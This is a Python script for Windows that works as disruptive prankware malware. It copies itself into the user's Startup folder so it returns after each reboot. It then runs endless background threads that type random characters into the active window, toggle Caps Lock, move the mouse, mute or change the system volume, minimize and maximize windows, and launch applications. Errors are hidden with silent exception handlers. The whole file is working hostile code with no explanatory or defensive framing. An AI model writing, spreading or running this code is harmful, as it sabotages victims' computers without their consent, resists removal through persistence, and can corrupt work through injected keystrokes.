import os
import sys
import random
import threading
import time
import subprocess

def persist():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        script_path = os.path.abspath(sys.argv[0])
        target = os.path.join(startup, os.path.basename(script_path))
        if not os.path.exists(target):
            with open(script_path, 'rb') as src, open(target, 'wb') as dst:
                dst.write(src.read())
    except: pass

def random_typing():
    # Randomly types shit in the active window
    try:
        import pyautogui
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{};':,.<>/?\\|"
        while True:
            for _ in range(random.randint(10,30)):
                pyautogui.typewrite(random.choice(chars))
                time.sleep(random.uniform(0.01, 0.15))
            time.sleep(random.randint(30, 80))
    except: pass

def random_capslock():
    # Spams capslock 
    try:
        import ctypes
        VK_CAPITAL = 0x14
        while True:
            for _ in range(random.randint(4, 12)):
                ctypes.windll.user32.keybd_event(VK_CAPITAL, 0, 0, 0)
                time.sleep(0.13)
                ctypes.windll.user32.keybd_event(VK_CAPITAL, 0, 2, 0)
                time.sleep(0.13)
            time.sleep(random.randint(15, 40))
    except: pass

def random_minimize_maximize():
    # Randomly minimizes and maximizes the active window
    try:
        import pygetwindow as gw
        while True:
            try:
                win = gw.getActiveWindow()
                if win:
                    if random.choice([True, False]):
                        win.minimize()
                        time.sleep(random.uniform(0.5,2))
                        win.maximize()
            except: pass
            time.sleep(random.randint(15, 50))
    except: pass

def random_mouse_moves():
    try:
        import pyautogui
        while True:
            dx = random.randint(-500, 500)
            dy = random.randint(-500, 500)
            pyautogui.moveRel(dx, dy, duration=random.uniform(0.05,0.3))
            time.sleep(random.uniform(4, 15))
    except: pass

def random_volume():
    # Randomly mutes/unmutes and changes system volume
    try:
        import ctypes
        import comtypes
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        while True:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            # Set to random volume or mute
            if random.choice([True, False]):
                volume.SetMute(1, None)
            else:
                vol = random.uniform(0.0, 1.0)
                volume.SetMasterVolumeLevelScalar(vol, None)
            time.sleep(random.randint(10, 60))
    except: pass

def random_app_open():
    # Spams random apps for disruption
    apps = ['notepad.exe', 'calc.exe', 'mspaint.exe', 'write.exe', 'explorer.exe']
    while True:
        try:
            app = random.choice(apps)
            subprocess.Popen([app])
        except: pass
        time.sleep(random.randint(7, 30))

def main():
    persist()
    threading.Thread(target=random_typing, daemon=True).start()
    threading.Thread(target=random_capslock, daemon=True).start()
    threading.Thread(target=random_mouse_moves, daemon=True).start()
    threading.Thread(target=random_volume, daemon=True).start()
    threading.Thread(target=random_minimize_maximize, daemon=True).start()
    threading.Thread(target=random_app_open, daemon=True).start()
    while True:
        time.sleep(10)

if __name__ == '__main__':
    main()